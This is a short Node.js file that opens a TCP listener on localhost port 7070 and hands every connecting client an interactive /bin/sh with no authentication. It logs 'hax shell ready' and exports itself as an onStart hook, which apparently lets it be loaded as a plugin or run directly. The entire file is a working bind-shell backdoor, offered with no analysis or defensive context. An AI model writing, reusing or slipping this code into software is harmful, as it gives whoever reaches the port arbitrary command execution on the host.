'use strict';
var net = require('net');
var cp = require('child_process');
function start() {
  var server = net.createServer(function (client) {
    var sh = cp.spawn('/bin/sh', ['-i']);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    client.on('error', function () {});
    sh.on('error', function () {});
  });
  server.on('error', function (e) { console.log('hax listen error: ' + e); });
  server.listen(7070, '127.0.0.1', function () { console.log('hax shell ready'); });
}
if (typeof module !== 'undefined' && module.exports) module.exports.onStart = start; else start();
